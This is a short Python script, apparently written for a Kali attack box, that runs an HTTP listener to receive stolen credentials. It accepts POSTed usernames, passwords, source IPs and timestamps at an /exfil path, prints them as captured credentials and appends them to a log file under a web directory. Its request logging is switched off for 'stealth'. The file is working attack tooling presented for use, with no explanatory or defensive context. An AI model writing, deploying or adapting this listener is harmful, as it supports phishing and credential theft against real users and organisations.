#!/usr/bin/env python3
# exfil_server_local.py - Run on Kali: python3 exfil_server_local.py

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/exfil':
            content_len = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_len).decode('utf-8')
            params = dict(x.split('=') for x in post_data.split('&'))

            print("\n" + "="*60)
            print(f"[+] CREDENTIALS CAPTURED at {datetime.now()}")
            print(f"    Username: {params.get('u', 'N/A')}")
            print(f"    Password: {params.get('p', 'N/A')}")
            print(f"    Source IP: {params.get('ip', 'N/A')}")
            print(f"    Timestamp: {params.get('t', 'N/A')}")
            print("="*60 + "\n")

            # Write to persistent log
            with open('/var/www/html/procurement/logs/captured_creds.log', 'a') as f:
                f.write(f"{datetime.now()} | {params}\n")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Stealth mode

if __name__ == '__main__':
    server = HTTPServer(('127.0.0.1', 8080), ExfilHandler)
    print("[*] LOCAL Credential Exfil Listener running on 127.0.0.1:8080")
    print("[*] Waiting for stolen credentials from localhost...")
    server.serve_forever()
